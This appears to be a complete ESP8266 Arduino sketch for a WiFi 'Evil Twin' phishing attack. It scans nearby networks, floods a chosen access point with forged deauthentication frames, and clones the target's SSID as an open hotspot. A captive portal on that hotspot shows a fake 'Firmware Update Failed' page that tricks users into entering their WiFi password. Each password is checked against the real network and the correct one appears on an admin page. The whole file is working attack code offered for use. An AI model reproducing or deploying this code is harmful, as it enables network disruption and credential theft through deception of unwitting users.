#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<span style='color: #ff3e3e;'>&#9888;</span> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = R"=====(
    :root {
      --primary: #0066ff;
      --secondary: #f8f9fa;
      --danger: #dc3545;
      --success: #28a745;
      --warning: #ffc107;
      --dark: #343a40;
      --light: #f8f9fa;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    }
    
    body {
      background-color: #f5f5f5;
      color: #333;
      line-height: 1.6;
      padding: 0;
      margin: 0;
    }
    
    nav {
      background: var(--primary);
      color: white;
      padding: 1rem;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    
    nav b {
      font-size: 1.5rem;
      display: block;
      margin-bottom: 0.5rem;
    }
    
    .container {
      max-width: 800px;
      margin: 0 auto;
      padding: 1rem;
    }
    
    .card {
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
      padding: 1.5rem;
      margin-bottom: 1.5rem;
    }
    
    h1 {
      color: var(--dark);
      margin-bottom: 1rem;
      font-size: 1.8rem;
    }
    
    .form-group {
      margin-bottom: 1.5rem;
    }
    
    label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: var(--dark);
    }
    
    input[type="password"],
    input[type="text"] {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 1rem;
      transition: border 0.3s;
    }
    
    input[type="password"]:focus,
    input[type="text"]:focus {
      border-color: var(--primary);
      outline: none;
      box-shadow: 0 0 0 3px rgba(0,102,255,0.1);
    }
    
    .btn {
      display: inline-block;
      background: var(--primary);
      color: white;
      padding: 0.75rem 1.5rem;
      border: none;
      border-radius: 4px;
      font-size: 1rem;
      cursor: pointer;
      text-decoration: none;
      transition: background 0.3s, transform 0.2s;
    }
    
    .btn:hover {
      background: #0052cc;
      transform: translateY(-1px);
    }
    
    .btn-block {
      display: block;
      width: 100%;
    }
    
    .btn-danger {
      background: var(--danger);
    }
    
    .btn-danger:hover {
      background: #c82333;
    }
    
    .btn-success {
      background: var(--success);
    }
    
    .btn-success:hover {
      background: #218838;
    }
    
    .btn-warning {
      background: var(--warning);
      color: var(--dark);
    }
    
    .btn-warning:hover {
      background: #e0a800;
    }
    
    .alert {
      padding: 1rem;
      border-radius: 4px;
      margin-bottom: 1rem;
    }
    
    .alert-success {
      background: #d4edda;
      color: #155724;
    }
    
    .alert-danger {
      background: #f8d7da;
      color: #721c24;
    }
    
    table {
      width: 100%;
      border-collapse: collapse;
      margin-bottom: 1rem;
    }
    
    th, td {
      padding: 0.75rem;
      text-align: left;
      border-bottom: 1px solid #ddd;
    }
    
    th {
      background: var(--secondary);
      font-weight: 500;
    }
    
    tr:hover {
      background: rgba(0,0,0,0.02);
    }
    
    .text-center {
      text-align: center;
    }
    
    .mt-3 {
      margin-top: 1rem;
    }
    
    .mb-3 {
      margin-bottom: 1rem;
    }
    
    .progress {
      width: 100%;
      height: 20px;
      background: #e9ecef;
      border-radius: 4px;
      overflow: hidden;
      margin: 1rem 0;
    }
    
    .progress-bar {
      height: 100%;
      background: var(--primary);
      transition: width 0.3s;
    }
    
    .footer {
      text-align: center;
      padding: 1rem;
      color: #6c757d;
      font-size: 0.9rem;
    }
    
    @media (max-width: 768px) {
      .container {
        padding: 0.5rem;
      }
      
      .card {
        padding: 1rem;
      }
    }
  )=====";

  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name='viewport' content='width=device-width, initial-scale=1'>"
             "<style>" + CSS + "</style>"
             "<meta charset='UTF-8'>"
             "<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css'>"
             "</head>"
             "<body>"
             "<nav><b>" + a + "</b> " + SUBTITLE + "</nav>"
             "<div class='container'>"
             "<div class='card'>"
             "<h1>" + t + "</h1>";
  return h;
}

String footer() {
  return "</div></div><div class='footer'>&copy; All rights reserved.</div></body></html>";
}

String index() {
  return header(TITLE) + "<div class='form-group'>" + BODY + "</div>"
         "<form action='/' method='post'>"
         "<div class='form-group'>"
         "<label for='password'><i class='fas fa-lock'></i> WiFi Password</label>"
         "<input type='password' id='password' name='password' minlength='8' placeholder='Enter your password'>"
         "</div>"
         "<button type='submit' class='btn btn-block'>Continue <i class='fas fa-arrow-right'></i></button>"
         "</form>" + footer();
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("ESP Phish", "0x0806");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", 
      "<!DOCTYPE html>"
      "<html>"
      "<head>"
      "<meta name='viewport' content='width=device-width, initial-scale=1'>"
      "<style>"
      "body {"
      "  font-family: 'Segoe UI', Roboto, sans-serif;"
      "  background-color: #f8f9fa;"
      "  display: flex;"
      "  justify-content: center;"
      "  align-items: center;"
      "  height: 100vh;"
      "  margin: 0;"
      "}"
      ".alert-box {"
      "  background: white;"
      "  padding: 2rem;"
      "  border-radius: 8px;"
      "  box-shadow: 0 4px 20px rgba(0,0,0,0.1);"
      "  text-align: center;"
      "  max-width: 400px;"
      "  width: 90%;"
      "}"
      ".icon {"
      "  font-size: 4rem;"
      "  color: #dc3545;"
      "  margin-bottom: 1rem;"
      "}"
      "h2 {"
      "  margin-bottom: 1rem;"
      "  color: #343a40;"
      "}"
      "p {"
      "  color: #6c757d;"
      "  margin-bottom: 1.5rem;"
      "}"
      "</style>"
      "<script>"
      "setTimeout(function(){"
      "  window.location.href = '/';"
      "}, 4000);"
      "</script>"
      "</head>"
      "<body>"
      "<div class='alert-box'>"
      "<div class='icon'>&#10006;</div>"
      "<h2>Wrong Password</h2>"
      "<p>Please try again.</p>"
      "</div>"
      "</body>"
      "</html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("ESP Phish", "0x0806");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

String _tempHTML = R"=====(
<!DOCTYPE html>
<html>
<head>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <style>
    .network-table {
      width: 100%;
      border-collapse: collapse;
      margin: 1rem 0;
    }
    .network-table th, .network-table td {
      padding: 0.75rem;
      border: 1px solid #dee2e6;
    }
    .network-table th {
      background-color: #f8f9fa;
      font-weight: 600;
    }
    .network-table tr:hover {
      background-color: rgba(0,0,0,0.02);
    }
    .action-buttons {
      display: flex;
      gap: 0.5rem;
      margin-bottom: 1rem;
    }
    .selected {
      background-color: #e8f4fd !important;
    }
  </style>
</head>
<body>
<nav><b>WiFi Networks</b> SCAN RESULTS</nav>
<div class='container'>
<div class='card'>
<h1>Available Networks</h1>
<div class='action-buttons'>
  <form method='post' action='/?deauth={deauth}'>
    <button type='submit' class='btn {deauth_class}' {deauth_disabled}>
      <i class='fas {deauth_icon}'></i> {deauth_button}
    </button>
  </form>
  <form method='post' action='/?hotspot={hotspot}'>
    <button type='submit' class='btn {hotspot_class}' {hotspot_disabled}>
      <i class='fas {hotspot_icon}'></i> {hotspot_button}
    </button>
  </form>
</div>
<table class='network-table'>
  <thead>
    <tr>
      <th>SSID</th>
      <th>BSSID</th>
      <th>Channel</th>
      <th>Action</th>
    </tr>
  </thead>
  <tbody>
)=====";

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("WiPhi_34732", "d347h320");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") {
        break;
      }
      String rowClass = (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) ? "class='selected'" : "";
      
      _html += "<tr " + rowClass + ">";
      _html += "<td>" + _networks[i].ssid + "</td>";
      _html += "<td>" + bytesToStr(_networks[i].bssid, 6) + "</td>";
      _html += "<td>" + String(_networks[i].ch) + "</td>";
      _html += "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
      _html += "<button type='submit' class='btn btn-sm'>";
      _html += (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) ? "<i class='fas fa-check-circle'></i> Selected" : "<i class='fas fa-mouse-pointer'></i> Select";
      _html += "</button></form></td></tr>";
    }

    _html += "</tbody></table>";

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop Deauth");
      _html.replace("{deauth}", "stop");
      _html.replace("{deauth_class}", "btn-danger");
      _html.replace("{deauth_icon}", "fa-stop");
    } else {
      _html.replace("{deauth_button}", "Start Deauth");
      _html.replace("{deauth}", "start");
      _html.replace("{deauth_class}", "btn-warning");
      _html.replace("{deauth_icon}", "fa-play");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
      _html.replace("{hotspot_class}", "btn-danger");
      _html.replace("{hotspot_icon}", "fa-stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
      _html.replace("{hotspot_class}", "btn-success");
      _html.replace("{hotspot_icon}", "fa-broadcast-tower");
    }

    if (_selectedNetwork.ssid == "") {
      _html.replace("{deauth_disabled}", "disabled");
      _html.replace("{hotspot_disabled}", "disabled");
    } else {
      _html.replace("{deauth_disabled}", "");
      _html.replace("{hotspot_disabled}", "");
    }

    if (_correct != "") {
      _html += "<div class='alert alert-success'><i class='fas fa-check-circle'></i> " + _correct + "</div>";
    }

    _html += "</div></div></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      
      String loadingPage = R"=====(
<!DOCTYPE html>
<html>
<head>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <style>
    .loading-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
      padding: 2rem;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 1.5rem;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    h2 {
      margin-bottom: 1rem;
      color: #343a40;
    }
    .progress-container {
      width: 100%;
      max-width: 300px;
      margin: 1rem auto;
    }
  </style>
  <script>
    setTimeout(function(){
      window.location.href = '/result';
    }, 15000);
  </script>
</head>
<body>
  <div class='loading-container'>
    <div class='spinner'></div>
    <h2>Verifying Integrity</h2>
    <p>Please wait while we verify your credentials...</p>
    <div class='progress-container'>
      <div class='progress'>
        <div class='progress-bar' style='width: 10%'></div>
      </div>
    </div>
  </div>
</body>
</html>
)=====";
      
      webServer.send(200, "text/html", loadingPage);
      if (webServer.arg("deauth") == "start") {
        deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }
}

void handleAdmin() {
  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("WiPhi_34732", "d347h320");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    String rowClass = (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) ? "class='selected'" : "";
    
    _html += "<tr " + rowClass + ">";
    _html += "<td>" + _networks[i].ssid + "</td>";
    _html += "<td>" + bytesToStr(_networks[i].bssid, 6) + "</td>";
    _html += "<td>" + String(_networks[i].ch) + "</td>";
    _html += "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
    _html += "<button type='submit' class='btn btn-sm'>";
    _html += (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) ? "<i class='fas fa-check-circle'></i> Selected" : "<i class='fas fa-mouse-pointer'></i> Select";
    _html += "</button></form></td></tr>";
  }

  _html += "</tbody></table>";

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop Deauth");
    _html.replace("{deauth}", "stop");
    _html.replace("{deauth_class}", "btn-danger");
    _html.replace("{deauth_icon}", "fa-stop");
  } else {
    _html.replace("{deauth_button}", "Start Deauth");
    _html.replace("{deauth}", "start");
    _html.replace("{deauth_class}", "btn-warning");
    _html.replace("{deauth_icon}", "fa-play");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
    _html.replace("{hotspot_class}", "btn-danger");
    _html.replace("{hotspot_icon}", "fa-stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
    _html.replace("{hotspot_class}", "btn-success");
    _html.replace("{hotspot_icon}", "fa-broadcast-tower");
  }

  if (_selectedNetwork.ssid == "") {
    _html.replace("{deauth_disabled}", "disabled");
    _html.replace("{hotspot_disabled}", "disabled");
  } else {
    _html.replace("{deauth_disabled}", "");
    _html.replace("{hotspot_disabled}", "");
  }

  if (_correct != "") {
    _html += "<div class='alert alert-success'><i class='fas fa-check-circle'></i> " + _correct + "</div>";
  }

  _html += "</div></div></body></html>";
  webServer.send(200, "text/html", _html);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
